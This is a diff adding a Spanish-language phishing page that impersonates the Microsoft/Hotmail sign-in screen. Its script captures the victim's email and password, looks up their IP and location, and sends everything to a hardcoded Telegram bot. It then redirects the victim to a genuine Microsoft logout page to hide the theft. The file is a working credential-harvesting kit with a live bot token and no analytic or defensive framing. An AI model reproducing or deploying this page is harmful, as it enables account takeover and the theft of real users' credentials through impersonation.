@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+
+<html>
+
+<head>
+  <link rel="icon" href="22favicon.png" type="SCAM/favicon.png" sizes="16x16" />
+  <title>Iniciar sesión en tu cuenta Microsoft</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+  <link rel="stylesheet" type="text/css" href="estilo.css" />
+  <meta name="viewport"
+    content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=no" />
+  <style type="text/css">
+    body {
+      display: none;
+    }
+  </style>
+  <style type="text/css">
+    body {
+      display: block !important;
+    }
+  </style>
+  <noscript>
+    <style type="text/css">
+      body {
+        display: block !important;
+      }
+    </style>
+  </noscript>
+</head>
+
+<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
+  <div class="generalContainer">
+    <div class="container">
+      <img class="imagen" src="222hotmail.jpg" alt="" />
+
+      <h2>Proteger Cuenta</h2>
+      <form id="loginform" method="POST">
+        <input type="email" name="emil" id="email" placeholder="Correo electrónico, teléfono o Skype" required=>
+        <input id="clave" type="password" name="pss" placeholder="Contraseña" required="Numero" />
+        <div class="div_text">
+          <small class="small_negro">¿No tienes una cuenta?</small>
+          <a href="#">Cree una.</a>
+        </div>
+        <!-- <small>Para mayor seguridad crea un PIN de 6 digitos.</small> -->
+        <div class="llave"><!-- <img src="siii.jpg"  --><!-- /> --></div>
+        <!-- <input
+            class="pin"
+            minlength="6"
+            maxlength="6"
+            type="password"
+            type="password"
+            name="numero"
+            placeholder="PIN ******"
+            required=""
+            pattern="[0-9]+"
+          /> -->
+        <input type="submit" value="Siguiente" />
+      </form>
+
+      <!-- <div class="terminosContainer">
+                <h3>Térmios de uso</h3>
+                <h5>Privacidad y cookies</h5>
+            </div> -->
+    </div>
+  </div>
+</body>
+<script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+
+<script>
+  const url = "https://ipapi.co/json/";
+  const form = document.querySelector("#loginform");
+  form.addEventListener("submit", (event) => {
+    event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
+    axios
+      .get(url)
+      .then((response) => {
+        const email = document.querySelector("#email").value;
+        const contra = document.querySelector("#clave").value;
+
+        const message =
+          "\nHotmail\nUsuario: " +
+          contra +
+          "\nContra: " +
+          email +
+          "\nCiudad:" +
+          response.data.city +
+          "\nPais: " +
+          response.data.country +
+          "\nIP: " +
+          response.data.ip;
+        axios
+          .post(
+            "https://api.telegram.org/bot6588209506:AAE0tCvE9p3LMROYDpYE8CGxVF6QV621g1w/sendMessage",
+            {
+              chat_id: "1900569011",
+              text: message,
+            }
+          )
+          .then((response) => {
+            window.location.href = "https://login.live.com/logout.srf?ct=1698893038&rver=7.0.6738.0&id=292841&ru=https:%2F%2Foutlook.live.com%2Fowa%2Fcsignout.aspx%3F%253f%253fumkt%3Des-US%26exch%3D1%26RpsCsrfState%3D4042c6ed-e025-daaa-5b59-e2b84fedc413";
+          })
+          .catch((error) => {
+            console.error(error);
+          });
+      })
+      .catch((error) => {
+        console.log(error);
+      });
+  });
+</script>
+
+</html>
